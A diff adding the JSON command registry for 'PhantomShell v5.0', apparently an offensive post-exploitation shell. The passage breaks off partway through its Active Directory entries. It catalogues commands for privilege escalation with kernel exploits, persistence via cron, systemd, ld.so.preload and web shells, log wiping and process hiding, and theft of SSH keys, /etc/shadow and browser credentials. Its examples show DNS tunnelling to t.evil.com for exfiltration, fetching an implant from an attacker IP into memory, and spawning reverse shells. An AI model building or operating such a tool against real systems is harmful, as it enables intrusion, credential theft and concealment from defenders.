@@ -1,0 +1,1367 @@
+{
+  "version": "5.0",
+  "description": "PhantomShell v5.0 — Unified Command Registry. Single source of truth for help system, tab completion, and argument validation.",
+  "commands": {
+
+    "help": {
+      "category": "shell",
+      "description": "Display help information for commands or categories",
+      "usage": "help [command|category]",
+      "args": [
+        {"name": "topic", "type": "string", "required": false, "description": "Command name or category to get detailed help for"}
+      ],
+      "examples": ["help", "help pivoting", "help portscan", "help privesc_auto"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "cd": {
+      "category": "shell",
+      "description": "Change working directory",
+      "usage": "cd [directory]",
+      "args": [
+        {"name": "directory", "type": "path", "required": false, "description": "Target directory. Defaults to $HOME. Use '-' for previous directory."}
+      ],
+      "examples": ["cd /tmp", "cd ..", "cd -", "cd"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "pwd": {
+      "category": "shell",
+      "description": "Print current working directory",
+      "usage": "pwd",
+      "args": [],
+      "examples": ["pwd"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "clear": {
+      "category": "shell",
+      "description": "Clear the terminal screen",
+      "usage": "clear",
+      "args": [],
+      "examples": ["clear"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "history": {
+      "category": "shell",
+      "description": "Display command history. Use !! to repeat last command, !N to repeat command N.",
+      "usage": "history",
+      "args": [],
+      "examples": ["history", "!!", "!5"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "pty": {
+      "category": "shell",
+      "description": "Spawn a fully interactive PTY shell (python pty.spawn or script fallback)",
+      "usage": "pty",
+      "args": [],
+      "examples": ["pty"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "alias": {
+      "category": "shell",
+      "description": "Show all command aliases (ll, la, cls, .., bg, dir, type, etc.)",
+      "usage": "alias",
+      "args": [],
+      "examples": ["alias"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "mode": {
+      "category": "shell",
+      "description": "Display current operating mode (FULL, NORMAL, or MINIMAL)",
+      "usage": "mode",
+      "args": [],
+      "examples": ["mode"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "capabilities": {
+      "category": "shell",
+      "description": "Display all detected server capabilities (memory, exec, disk, proc_open, fork, network)",
+      "usage": "capabilities",
+      "args": [],
+      "examples": ["capabilities"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "exit": {
+      "category": "shell",
+      "description": "Disconnect from the target and allow reconnection",
+      "usage": "exit",
+      "args": [],
+      "examples": ["exit", "quit"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "cat": {
+      "category": "files",
+      "description": "Display entire file contents",
+      "usage": "cat <file>",
+      "args": [
+        {"name": "file", "type": "path", "required": true, "description": "Path to the file to display"}
+      ],
+      "examples": ["cat /etc/passwd", "cat config.php"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "head": {
+      "category": "files",
+      "description": "Display the first N lines of a file (default 10)",
+      "usage": "head <file> [lines]",
+      "args": [
+        {"name": "file", "type": "path", "required": true, "description": "Path to the file"},
+        {"name": "lines", "type": "integer", "required": false, "description": "Number of lines to show (default: 10)"}
+      ],
+      "examples": ["head /etc/passwd", "head /var/log/syslog 50"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "tail": {
+      "category": "files",
+      "description": "Display the last N lines of a file (default 10)",
+      "usage": "tail <file> [lines]",
+      "args": [
+        {"name": "file", "type": "path", "required": true, "description": "Path to the file"},
+        {"name": "lines", "type": "integer", "required": false, "description": "Number of lines to show (default: 10)"}
+      ],
+      "examples": ["tail /var/log/auth.log", "tail /var/log/syslog 100"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "ls": {
+      "category": "files",
+      "description": "List directory contents with color output",
+      "usage": "ls [options] [path]",
+      "args": [
+        {"name": "args", "type": "string", "required": false, "description": "Any ls flags and/or target path (e.g. -la /tmp)"}
+      ],
+      "examples": ["ls", "ls -la", "ls /var/www/html", "ls -la /home"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "upload": {
+      "category": "files",
+      "description": "Upload a file via base64 encoding. Send base64 data terminated by --EOF-- line.",
+      "usage": "upload [filename]",
+      "args": [
+        {"name": "filename", "type": "string", "required": false, "description": "Destination filename (default: upload_<timestamp>)"}
+      ],
+      "examples": ["upload /tmp/linpeas.sh", "upload exploit.elf"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "download": {
+      "category": "files",
+      "description": "Download a file from the target encoded as base64 between --BEGIN-B64-- and --END-B64-- markers",
+      "usage": "download <file>",
+      "args": [
+        {"name": "file", "type": "path", "required": true, "description": "Path to the file to download"}
+      ],
+      "examples": ["download /etc/shadow", "download /tmp/loot.tar.gz"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "edit": {
+      "category": "files",
+      "description": "Interactive line editor. Supports insert (i), append (a), delete (d), replace (r), print (p), save (w), save+quit (wq), quit (q).",
+      "usage": "edit <file>",
+      "args": [
+        {"name": "file", "type": "path", "required": true, "description": "Path to the file to edit (created if not exists)"}
+      ],
+      "examples": ["edit /tmp/script.sh", "edit /var/www/html/config.php"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "cp": {
+      "category": "files",
+      "description": "Copy files or directories",
+      "usage": "cp <source> <destination>",
+      "args": [
+        {"name": "source", "type": "path", "required": true, "description": "Source file or directory"},
+        {"name": "destination", "type": "path", "required": true, "description": "Destination path"}
+      ],
+      "examples": ["cp /etc/passwd /tmp/passwd.bak", "cp -r /var/www /tmp/www_backup"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "mv": {
+      "category": "files",
+      "description": "Move or rename files",
+      "usage": "mv <source> <destination>",
+      "args": [
+        {"name": "source", "type": "path", "required": true, "description": "Source file or directory"},
+        {"name": "destination", "type": "path", "required": true, "description": "Destination path"}
+      ],
+      "examples": ["mv /tmp/exploit /tmp/.cache", "mv old.txt new.txt"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "rm": {
+      "category": "files",
+      "description": "Remove files or directories",
+      "usage": "rm [options] <path>",
+      "args": [
+        {"name": "args", "type": "string", "required": true, "description": "Flags and file path(s) to remove"}
+      ],
+      "examples": ["rm /tmp/exploit.c", "rm -rf /tmp/loot"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "mkdir": {
+      "category": "files",
+      "description": "Create directories",
+      "usage": "mkdir [options] <directory>",
+      "args": [
+        {"name": "args", "type": "string", "required": true, "description": "Directory path to create, optionally with -p for parents"}
+      ],
+      "examples": ["mkdir /tmp/.hidden", "mkdir -p /tmp/a/b/c"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "touch": {
+      "category": "files",
+      "description": "Create an empty file or update file timestamp",
+      "usage": "touch <file>",
+      "args": [
+        {"name": "file", "type": "path", "required": true, "description": "File path to create or update"}
+      ],
+      "examples": ["touch /tmp/marker", "touch /var/www/html/.htaccess"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "sysinfo": {
+      "category": "recon",
+      "description": "Comprehensive system enumeration: hostname, kernel, OS, CPU, memory, disk, users, interfaces, DNS, routes, listening ports, processes, crontabs, SUID binaries",
+      "usage": "sysinfo",
+      "args": [],
+      "examples": ["sysinfo"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "env": {
+      "category": "recon",
+      "description": "Display all environment variables",
+      "usage": "env",
+      "args": [],
+      "examples": ["env"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "services": {
+      "category": "recon",
+      "description": "List running services (systemctl or service --status-all fallback)",
+      "usage": "services",
+      "args": [],
+      "examples": ["services"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "ports": {
+      "category": "recon",
+      "description": "Show listening TCP ports (ss -tlnp or netstat fallback)",
+      "usage": "ports",
+      "args": [],
+      "examples": ["ports"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "firewall": {
+      "category": "recon",
+      "description": "Display firewall rules (iptables + nftables)",
+      "usage": "firewall",
+      "args": [],
+      "examples": ["firewall"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "netmap": {
+      "category": "recon",
+      "description": "Map the local network: discover subnets, hosts, and services on adjacent segments",
+      "usage": "netmap [subnet]",
+      "args": [
+        {"name": "subnet", "type": "string", "required": false, "description": "Target subnet in CIDR (e.g. 10.0.0.0/24). Auto-detected if omitted."}
+      ],
+      "examples": ["netmap", "netmap 192.168.1.0/24"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "vuln_scan": {
+      "category": "vuln",
+      "description": "Full vulnerability scanner: kernel CVEs (DirtyCow, OverlayFS, DirtyPipe, GameOverlay, nf_tables, Netfilter, StackRot, DirtyCredential), SUID+GTFOBins, sudo CVEs, docker socket, polkit/PwnKit, writable cron, capabilities, /etc/passwd+shadow permissions, SSH keys, config files",
+      "usage": "vuln_scan",
+      "args": [],
+      "examples": ["vuln_scan"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "exploit_suggest": {
+      "category": "exploits",
+      "description": "Suggest kernel exploits based on detected kernel version. Checks DirtyCow, PwnKit, DirtyPipe, GameOverlay, nf_tables, Baron Samedit.",
+      "usage": "exploit_suggest",
+      "args": [],
+      "examples": ["exploit_suggest"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "exploit_fetch": {
+      "category": "exploits",
+      "description": "Download exploit source code from exploit-db or GitHub by CVE ID",
+      "usage": "exploit_fetch <CVE-ID>",
+      "args": [
+        {"name": "cve", "type": "string", "required": true, "description": "CVE identifier (e.g. CVE-2022-0847)"}
+      ],
+      "examples": ["exploit_fetch CVE-2022-0847", "exploit_fetch CVE-2021-4034"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "exploit_compile": {
+      "category": "exploits",
+      "description": "Compile a previously fetched exploit (gcc with various fallback flags)",
+      "usage": "exploit_compile <CVE-ID>",
+      "args": [
+        {"name": "cve", "type": "string", "required": true, "description": "CVE identifier matching the fetched source file"}
+      ],
+      "examples": ["exploit_compile CVE-2022-0847", "exploit_compile CVE-2016-5195"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "privesc_check": {
+      "category": "privesc",
+      "description": "Enumerate privilege escalation vectors: SUID, SGID, sudo, cron, capabilities, writable PATH, docker/LXD groups, NFS, internal ports, writable /etc files",
+      "usage": "privesc_check",
+      "args": [],
+      "examples": ["privesc_check"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "privesc_auto": {
+      "category": "privesc",
+      "description": "Attempt automatic privilege escalation via PwnKit (CVE-2021-4034), GameOverlay (CVE-2023-2640), and DirtyPipe (CVE-2022-0847)",
+      "usage": "privesc_auto",
+      "args": [],
+      "examples": ["privesc_auto"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "privesc_suggest": {
+      "category": "privesc",
+      "description": "Display a manual privilege escalation checklist (sudo, SUID, cron, capabilities, PATH hijack, LD_PRELOAD, kernel exploits, docker, NFS, /etc/passwd)",
+      "usage": "privesc_suggest",
+      "args": [],
+      "examples": ["privesc_suggest"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "portscan": {
+      "category": "network",
+      "description": "TCP port scanner with banner grabbing and service identification",
+      "usage": "portscan <host> <ports> [timeout]",
+      "args": [
+        {"name": "host", "type": "string", "required": true, "description": "Target hostname or IP address"},
+        {"name": "ports", "type": "string", "required": true, "description": "Port specification: single (80), range (1-1024), comma-separated (22,80,443), or mixed (22,80,1000-2000)"},
+        {"name": "timeout", "type": "float", "required": false, "description": "Connection timeout in seconds per port (default: 1.0)"}
+      ],
+      "examples": ["portscan 10.0.0.1 1-1024", "portscan 192.168.1.100 22,80,443,3306,8080 0.5"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "connect": {
+      "category": "network",
+      "description": "Connect to a remote TCP port interactively. Use ~. to disconnect.",
+      "usage": "connect <host> <port>",
+      "args": [
+        {"name": "host", "type": "string", "required": true, "description": "Target hostname or IP"},
+        {"name": "port", "type": "integer", "required": true, "description": "Target port number"}
+      ],
+      "examples": ["connect 10.0.0.1 22", "connect 127.0.0.1 3306"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "listen": {
+      "category": "network",
+      "description": "Bind and listen on a TCP port, accept one connection interactively. Ctrl+C to cancel.",
+      "usage": "listen <port>",
+      "args": [
+        {"name": "port", "type": "integer", "required": true, "description": "Port number to listen on"}
+      ],
+      "examples": ["listen 4444", "listen 9001"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "bannergrab": {
+      "category": "network",
+      "description": "Grab service banner from a remote host:port. Sends protocol-appropriate probes for HTTP, SMTP.",
+      "usage": "bannergrab <host> <port>",
+      "args": [
+        {"name": "host", "type": "string", "required": true, "description": "Target hostname or IP"},
+        {"name": "port", "type": "integer", "required": true, "description": "Target port number"}
+      ],
+      "examples": ["bannergrab 10.0.0.1 22", "bannergrab 192.168.1.1 80"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "pivot_list": {
+      "category": "pivoting",
+      "description": "List all available pivoting methods with usage instructions",
+      "usage": "pivot_list",
+      "args": [],
+      "examples": ["pivot_list"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "pivot_portfwd": {
+      "category": "pivoting",
+      "description": "PHP-native TCP port forwarder. Forwards local port to remote host:port. Ctrl+C to stop.",
+      "usage": "pivot_portfwd <lport> <rhost> <rport>",
+      "args": [
+        {"name": "lport", "type": "integer", "required": true, "description": "Local port to listen on"},
+        {"name": "rhost", "type": "string", "required": true, "description": "Remote host to forward to"},
+        {"name": "rport", "type": "integer", "required": true, "description": "Remote port to forward to"}
+      ],
+      "examples": ["pivot_portfwd 8080 10.10.10.5 80", "pivot_portfwd 3306 db.internal 3306"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "pivot_socks": {
+      "category": "pivoting",
+      "description": "Start a SOCKS4 proxy server on port 1080 for proxychains. Ctrl+C to stop.",
+      "usage": "pivot_socks",
+      "args": [],
+      "examples": ["pivot_socks"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "pivot_tunnel": {
+      "category": "pivoting",
+      "description": "Create a TCP tunnel (reverse port forward): expose remote host:port on a local port",
+      "usage": "pivot_tunnel <rhost> <rport> <lport>",
+      "args": [
+        {"name": "rhost", "type": "string", "required": true, "description": "Remote host to tunnel to"},
+        {"name": "rport", "type": "integer", "required": true, "description": "Remote port to tunnel to"},
+        {"name": "lport", "type": "integer", "required": true, "description": "Local port to expose the tunnel on"}
+      ],
+      "examples": ["pivot_tunnel 10.10.10.5 80 8080"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "dns_tunnel": {
+      "category": "tunneling",
+      "description": "Establish a DNS tunnel for covert data exfiltration and C2 communication. Encodes data in DNS queries to bypass firewalls.",
+      "usage": "dns_tunnel <domain> [nameserver]",
+      "args": [
+        {"name": "domain", "type": "string", "required": true, "description": "Controlled domain for DNS tunneling (e.g. t.evil.com)"},
+        {"name": "nameserver", "type": "string", "required": false, "description": "Custom DNS server to route queries through"}
+      ],
+      "examples": ["dns_tunnel t.evil.com", "dns_tunnel data.c2.io 8.8.8.8"],
+      "agents": ["python", "csharp", "go"]
+    },
+    "icmp_tunnel": {
+      "category": "tunneling",
+      "description": "Establish an ICMP tunnel for covert communication. Encapsulates data in ICMP echo request/reply payloads.",
+      "usage": "icmp_tunnel <server_ip>",
+      "args": [
+        {"name": "server_ip", "type": "string", "required": true, "description": "IP address of the ICMP tunnel server (attacker)"}
+      ],
+      "examples": ["icmp_tunnel 10.13.5.162"],
+      "agents": ["python", "csharp", "go"]
+    },
+    "ws_tunnel": {
+      "category": "tunneling",
+      "description": "Establish a WebSocket tunnel. Wraps TCP traffic inside WebSocket frames to bypass HTTP-aware firewalls and proxies.",
+      "usage": "ws_tunnel <ws_url> [local_port]",
+      "args": [
+        {"name": "ws_url", "type": "string", "required": true, "description": "WebSocket server URL (e.g. ws://attacker:8080/ws)"},
+        {"name": "local_port", "type": "integer", "required": false, "description": "Local port to bind the tunnel endpoint (default: 1080)"}
+      ],
+      "examples": ["ws_tunnel ws://10.13.5.162:8080/ws", "ws_tunnel wss://c2.evil.com/tunnel 9050"],
+      "agents": ["python", "csharp", "go"]
+    },
+    "pipe_tunnel": {
+      "category": "tunneling",
+      "description": "Create a named pipe (FIFO) based tunnel for inter-process or inter-host communication without network sockets",
+      "usage": "pipe_tunnel <mode> [pipe_path]",
+      "args": [
+        {"name": "mode", "type": "string", "required": true, "description": "Tunnel mode: 'server' or 'client'"},
+        {"name": "pipe_path", "type": "string", "required": false, "description": "Path to the named pipe (default: /tmp/.p_<hash>)"}
+      ],
+      "examples": ["pipe_tunnel server", "pipe_tunnel client /tmp/.comm"],
+      "agents": ["python", "csharp", "go"]
+    },
+    "ssh_tunnel": {
+      "category": "tunneling",
+      "description": "Programmatic SSH tunnel creation (dynamic SOCKS, local forward, remote forward) without shelling out to ssh binary",
+      "usage": "ssh_tunnel <type> <user>@<host> [args]",
+      "args": [
+        {"name": "type", "type": "string", "required": true, "description": "Tunnel type: 'dynamic', 'local', or 'remote'"},
+        {"name": "target", "type": "string", "required": true, "description": "SSH target in user@host format"},
+        {"name": "args", "type": "string", "required": false, "description": "Type-specific args. dynamic: [bind_port]. local: <lport>:<rhost>:<rport>. remote: <rport>:<lhost>:<lport>."}
+      ],
+      "examples": ["ssh_tunnel dynamic root@10.0.0.1 1080", "ssh_tunnel local admin@pivot 8080:db:3306", "ssh_tunnel remote user@jump 9090:localhost:22"],
+      "agents": ["python", "csharp", "go"]
+    },
+
+    "persist_all": {
+      "category": "persist",
+      "description": "Install ALL persistence mechanisms at once (cron + ssh + systemd + rc + motd + php + web)",
+      "usage": "persist_all",
+      "args": [],
+      "examples": ["persist_all"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "persist_cron": {
+      "category": "persist",
+      "description": "Add a crontab entry that re-executes the shell every minute. Also attempts /etc/cron.d/ placement.",
+      "usage": "persist_cron",
+      "args": [],
+      "examples": ["persist_cron"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "persist_ssh": {
+      "category": "persist",
+      "description": "Add an SSH public key to authorized_keys for persistent access",
+      "usage": "persist_ssh",
+      "args": [],
+      "examples": ["persist_ssh"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "persist_systemd": {
+      "category": "persist",
+      "description": "Create a systemd service unit for persistence. Falls back to user-level service if system-level fails.",
+      "usage": "persist_systemd",
+      "args": [],
+      "examples": ["persist_systemd"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "persist_rc": {
+      "category": "persist",
+      "description": "Append shell execution to .bashrc, .profile, and .zshrc for login persistence",
+      "usage": "persist_rc",
+      "args": [],
+      "examples": ["persist_rc"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "persist_motd": {
+      "category": "persist",
+      "description": "Place a persistence script in /etc/update-motd.d/ to execute on user login",
+      "usage": "persist_motd",
+      "args": [],
+      "examples": ["persist_motd"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "persist_ldpreload": {
+      "category": "persist",
+      "description": "Compile a shared library and register it via /etc/ld.so.preload for automatic loading into every process",
+      "usage": "persist_ldpreload",
+      "args": [],
+      "examples": ["persist_ldpreload"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "persist_php": {
+      "category": "persist",
+      "description": "Set auto_prepend_file in php.ini or .user.ini to auto-load the shell on every PHP request",
+      "usage": "persist_php",
+      "args": [],
+      "examples": ["persist_php"],
+      "agents": ["php", "python"]
+    },
+    "persist_web": {
+      "category": "persist",
+      "description": "Drop a minimal web shell (.info.php / .health.php) in writable web directories",
+      "usage": "persist_web",
+      "args": [],
+      "examples": ["persist_web"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "clean_logs": {
+      "category": "evasion",
+      "description": "Truncate auth.log, syslog, messages, secure, apache/nginx access+error logs, wtmp, btmp. Clears bash history.",
+      "usage": "clean_logs",
+      "args": [],
+      "examples": ["clean_logs"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "clean_self": {
+      "category": "evasion",
+      "description": "Self-destruct: shred + delete the shell binary, remove all persistence copies and history, then exit",
+      "usage": "clean_self",
+      "args": [],
+      "examples": ["clean_self"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "hide_process": {
+      "category": "evasion",
+      "description": "Rename the process title to a legitimate-looking kernel thread name (e.g. [kworker/0:2])",
+      "usage": "hide_process",
+      "args": [],
+      "examples": ["hide_process"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "hide_connection": {
+      "category": "evasion",
+      "description": "Compile an LD_PRELOAD shared library to hide network connections from ss/netstat",
+      "usage": "hide_connection",
+      "args": [],
+      "examples": ["hide_connection"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "timestomp": {
+      "category": "evasion",
+      "description": "Modify file timestamps to match a reference file or reset to a fixed date (2020-01-01)",
+      "usage": "timestomp <file> [reference_file]",
+      "args": [
+        {"name": "file", "type": "path", "required": true, "description": "File whose timestamps to modify"},
+        {"name": "reference_file", "type": "path", "required": false, "description": "Reference file to copy timestamps from. If omitted, sets to 2020-01-01."}
+      ],
+      "examples": ["timestomp /tmp/exploit", "timestomp /tmp/shell.elf /bin/ls"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "alter_conn": {
+      "category": "evasion",
+      "description": "Spawn a new reverse shell to a different listener (bash, python3, or PHP fallback), then migrate",
+      "usage": "alter_conn <ip> <port>",
+      "args": [
+        {"name": "ip", "type": "string", "required": true, "description": "New listener IP address"},
+        {"name": "port", "type": "integer", "required": true, "description": "New listener port"}
+      ],
+      "examples": ["alter_conn 10.13.5.200 9001"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "memory_only": {
+      "category": "evasion",
+      "description": "Execute payloads entirely in memory without touching disk. Uses memfd_create or /dev/shm for fileless execution.",
+      "usage": "memory_only <payload_url>",
+      "args": [
+        {"name": "payload_url", "type": "string", "required": true, "description": "URL to fetch the payload from (fetched into memory, never written to disk)"}
+      ],
+      "examples": ["memory_only http://10.13.5.162:8888/implant.elf"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "lateral_ssh": {
+      "category": "lateral",
+      "description": "Attempt SSH lateral movement with optional password. Tests access by running 'id' on target.",
+      "usage": "lateral_ssh <user>@<host> [password]",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "SSH target in user@host format"},
+        {"name": "password", "type": "string", "required": false, "description": "SSH password (uses sshpass). Omit for key-based auth."}
+      ],
+      "examples": ["lateral_ssh root@10.0.0.5", "lateral_ssh admin@web01 P@ssw0rd"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "lateral_scp": {
+      "category": "lateral",
+      "description": "Copy files to/from remote hosts via SCP",
+      "usage": "lateral_scp <source> <user>@<host>:<dest>",
+      "args": [
+        {"name": "args", "type": "string", "required": true, "description": "SCP arguments: source path and user@host:destination"}
+      ],
+      "examples": ["lateral_scp /tmp/shell.elf root@10.0.0.5:/tmp/", "lateral_scp root@10.0.0.5:/etc/shadow /tmp/"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "lateral_wmi": {
+      "category": "lateral",
+      "description": "Execute commands on remote Windows hosts via WMI (requires impacket wmiexec.py)",
+      "usage": "lateral_wmi <user>@<host> <command>",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "Target in user@host or domain/user@host format"},
+        {"name": "command", "type": "string", "required": true, "description": "Command to execute on the remote host"}
+      ],
+      "examples": ["lateral_wmi administrator@10.0.0.5 whoami", "lateral_wmi CORP/admin@dc01 'ipconfig /all'"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "lateral_smb": {
+      "category": "lateral",
+      "description": "Enumerate or access SMB shares on remote hosts (requires smbclient)",
+      "usage": "lateral_smb <host> [share]",
+      "args": [
+        {"name": "host", "type": "string", "required": true, "description": "Target hostname or IP"},
+        {"name": "share", "type": "string", "required": false, "description": "Specific share name to connect to. Omit to list shares."}
+      ],
+      "examples": ["lateral_smb 10.0.0.5", "lateral_smb 10.0.0.5 C$"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "lateral_dcom": {
+      "category": "lateral",
+      "description": "Execute commands on remote Windows hosts via DCOM objects (MMC20.Application, ShellWindows, ShellBrowserWindow)",
+      "usage": "lateral_dcom <target> <command> [method]",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "Target in domain/user:password@host format"},
+        {"name": "command", "type": "string", "required": true, "description": "Command to execute on the remote host"},
+        {"name": "method", "type": "string", "required": false, "description": "DCOM method: 'mmc', 'shellwindows', or 'shellbrowser' (default: mmc)"}
+      ],
+      "examples": ["lateral_dcom CORP/admin:Pass@dc01 'cmd /c whoami'", "lateral_dcom admin:Pass@10.0.0.5 calc.exe shellwindows"],
+      "agents": ["csharp"]
+    },
+    "lateral_winrm": {
+      "category": "lateral",
+      "description": "Execute commands on remote Windows hosts via WinRM (Windows Remote Management) using the WS-Management protocol",
+      "usage": "lateral_winrm <target> <command> [auth]",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "Target in user:password@host format"},
+        {"name": "command", "type": "string", "required": true, "description": "Command or PowerShell script to execute"},
+        {"name": "auth", "type": "string", "required": false, "description": "Authentication method: 'ntlm', 'kerberos', or 'basic' (default: ntlm)"}
+      ],
+      "examples": ["lateral_winrm admin:Pass@10.0.0.5 'Get-Process'", "lateral_winrm admin:Pass@dc01 whoami kerberos"],
+      "agents": ["csharp"]
+    },
+    "lateral_psremoting": {
+      "category": "lateral",
+      "description": "Execute commands via PowerShell Remoting (Enter-PSSession / Invoke-Command) for interactive or batch remote execution",
+      "usage": "lateral_psremoting <target> <command> [credential]",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "Target hostname or IP"},
+        {"name": "command", "type": "string", "required": true, "description": "PowerShell command or scriptblock to execute remotely"},
+        {"name": "credential", "type": "string", "required": false, "description": "Credentials in domain\\user:password format"}
+      ],
+      "examples": ["lateral_psremoting dc01 'Get-ADUser -Filter *'", "lateral_psremoting 10.0.0.5 whoami 'CORP\\admin:P@ss'"],
+      "agents": ["csharp"]
+    },
+
+    "steal_all": {
+      "category": "stealing",
+      "description": "Run all credential harvesting modules at once: configs, SSH keys, history, passwords, /etc files, browsers",
+      "usage": "steal_all",
+      "args": [],
+      "examples": ["steal_all"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "steal_configs": {
+      "category": "stealing",
+      "description": "Find and extract credentials from config files (.env, wp-config.php, config.php, settings.inc.php, database.yml)",
+      "usage": "steal_configs",
+      "args": [],
+      "examples": ["steal_configs"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "steal_ssh": {
+      "category": "stealing",
+      "description": "Find and display SSH private keys (id_rsa, id_ed25519, id_ecdsa) from /home and /root",
+      "usage": "steal_ssh",
+      "args": [],
+      "examples": ["steal_ssh"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "steal_history": {
+      "category": "stealing",
+      "description": "Extract password-related entries from bash_history, zsh_history, and mysql_history files",
+      "usage": "steal_history",
+      "args": [],
+      "examples": ["steal_history"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "steal_passwords": {
+      "category": "stealing",
+      "description": "Grep for password patterns across /var/www, /opt, /srv, and /home directories",
+      "usage": "steal_passwords",
+      "args": [],
+      "examples": ["steal_passwords"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "steal_etc": {
+      "category": "stealing",
+      "description": "Extract interesting entries from /etc/passwd (shells, uid:0) and /etc/shadow (crackable hashes)",
+      "usage": "steal_etc",
+      "args": [],
+      "examples": ["steal_etc"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "steal_browsers": {
+      "category": "stealing",
+      "description": "Find browser credential stores: logins.json (Firefox), Login Data (Chrome), cookies databases",
+      "usage": "steal_browsers",
+      "args": [],
+      "examples": ["steal_browsers"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "ad_enum": {
+      "category": "ad",
+      "description": "Full Active Directory enumeration: domain info, trusts, sites, naming contexts, functional level",
+      "usage": "ad_enum [domain]",
+      "args": [
+        {"name": "domain", "type": "string", "required": false, "description": "Target domain FQDN. Auto-detected from DNS/environment if omitted."}
+      ],
+      "examples": ["ad_enum", "ad_enum corp.local"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_users": {
+      "category": "ad",
+      "description": "Enumerate AD users: list accounts, identify privileged users, check for AS-REP roastable accounts, find disabled accounts",
+      "usage": "ad_users [filter]",
+      "args": [
+        {"name": "filter", "type": "string", "required": false, "description": "LDAP filter or keyword to narrow results (e.g. 'admin', 'enabled', 'asrep')"}
+      ],
+      "examples": ["ad_users", "ad_users admin", "ad_users asrep"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_groups": {
+      "category": "ad",
+      "description": "Enumerate AD groups and their memberships. Highlights privileged groups (Domain Admins, Enterprise Admins, etc.)",
+      "usage": "ad_groups [filter]",
+      "args": [
